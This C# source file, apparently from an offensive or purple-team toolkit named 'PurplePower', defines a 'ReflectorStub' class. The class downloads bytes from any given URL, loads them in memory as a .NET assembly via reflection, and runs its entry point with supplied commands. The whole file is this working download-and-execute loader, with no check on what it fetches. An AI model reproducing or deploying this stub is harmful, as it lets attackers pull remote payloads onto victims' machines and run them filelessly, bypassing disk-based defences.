using System;
using System.Net;
using System.Reflection;

namespace PurplePower
{
    class ReflectorStub
    {
        public static object Reflect(string url, object[] commands)
        {
            object result = null;
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                WebClient client = new WebClient();
                Byte[] rawAssemblyBytes = { };
                Assembly bin = null;
                rawAssemblyBytes = client.DownloadData(url);
                bin = Assembly.Load(rawAssemblyBytes);
                try
                {
                    bin.EntryPoint.Invoke(null, new object[] { commands });
                }
                catch
                {
                    MethodInfo method = bin.EntryPoint;
                    if (method != null)
                    {
                        object o = bin.CreateInstance(method.Name);
                        result = method.Invoke(o, null);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);

            }
            return result;
        }
    }
}
